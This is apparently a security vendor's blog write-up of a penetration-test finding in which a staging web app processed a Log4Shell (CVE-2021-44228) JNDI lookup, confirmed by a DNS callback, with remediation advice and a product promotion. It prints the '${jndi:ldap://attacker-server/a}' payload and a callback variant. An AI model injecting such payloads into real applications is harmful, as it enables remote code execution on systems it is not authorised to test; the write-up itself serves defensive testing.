
---
layout: post
title: "Log4Shell in the Wild: Finding Vulnerable Log4j2 Logging in a Web Application"
author: snapsec
categories: [VAPT]
image: assets/images/23/LOG4j-image.png
---
 
## Introduction
 
Log4Shell (CVE-2021-44228) let a single logged string turn Log4j2 into remote code execution. It still shows up in the wild, usually in staging, internal tools, and dependencies nobody patched.
 
This is a finding from a real engagement: a staging web app processed a crafted JNDI payload and called out to infrastructure we controlled, confirming a vulnerable Log4j2 deployment.
 
> Target details are removed and screenshots are sanitized. This documents the technique, not the target.
 
## How It Works
 
Old Log4j2 versions evaluate `${...}` expressions in logged strings, including JNDI lookups. If attacker input reaches a vulnerable log call:
 
```text
${jndi:ldap://attacker-server/a}
```
 
Log4j2 performs a JNDI lookup to the attacker's LDAP server, which returns a remote Java class the app loads and runs — RCE. The injection point is any attacker-controlled input that ends up in a vulnerable log line: a form field, a header, a username.
 
## Detecting It Safely
 
Firing real RCE in someone's environment is reckless. The safe proof is an out-of-band callback: instead of loading a class, just confirm the target reaches infrastructure you control.
 
Generate a unique subdomain from a DNS logging service and put it in the payload:
 
```text
${jndi:ldap://<controlled-subdomain>/a}
```
 
If a vulnerable Log4j2 call processes it, the JNDI lookup resolves that subdomain and the request lands in your dashboard. Nothing is executed, nothing is touched.
 
### Image 1
 
![Image 1](/assets/images/log4j1.png)
 
Controlled subdomain from a DNS monitoring service.
 
## Reproduction
 
The payload went in through a feature that wrote user input to a server-side log — a user post.
 
### Image 2
 
![Image 2](/assets/images/log4j2.png)
 
Payload submitted through the application.
 
## Confirmation
 
The dashboard showed inbound requests for the controlled subdomain — the app resolved it while processing the payload.
 
### Image 3
 
![Image 3](/assets/images/log4j3.png)
 
DNS requests for the controlled subdomain.
 
A callback proves the vulnerable lookup path is live. It does not, by itself, prove code execution. So this is reported as confirmed vulnerable JNDI processing — the same path can be taken to full RCE via an LDAP referral in a permitted exploitation phase.
 
## Severity
 
- **Category:** Web App
- **Vulnerability:** Server-Side Injection > Remote Code Execution (RCE)
- **Component:** Log4j2 (CVE-2021-44228)
- **Environment:** Staging Web Application
- **Priority:** P1
> P1 reflects the original assessment. The evidence here confirms vulnerable JNDI processing and an outbound DNS callback, not arbitrary code execution.
 
Staging isn't a safe place for this. It often shares code, dependencies, and network paths with production — a vulnerable dependency here is a foothold.
 
## Remediation and Defense
 
- Upgrade Log4j2 to the latest supported release, and check the full dependency tree — Log4j2 is usually pulled in indirectly.
- Where you can't upgrade yet, follow Apache or vendor mitigation guidance to remove the vulnerable components.
- Restrict outbound network access from app servers so a stray lookup can't reach external LDAP or DNS.
- Detect `${jndi:` and its obfuscations as defense-in-depth, not as a fix.
## Takeaway
 
Log4Shell needs nothing more than getting a string into a logged field, and vulnerable versions still sit in environments nobody fully inventoried. Finding them first comes down to knowing what runs where — staging included — and testing input paths continuously, not once.
 
## Secure What Matters
 
Find vulnerabilities before attackers do.
 
[Get a demo with Snapsec](https://suite.snapsec.co/demo)
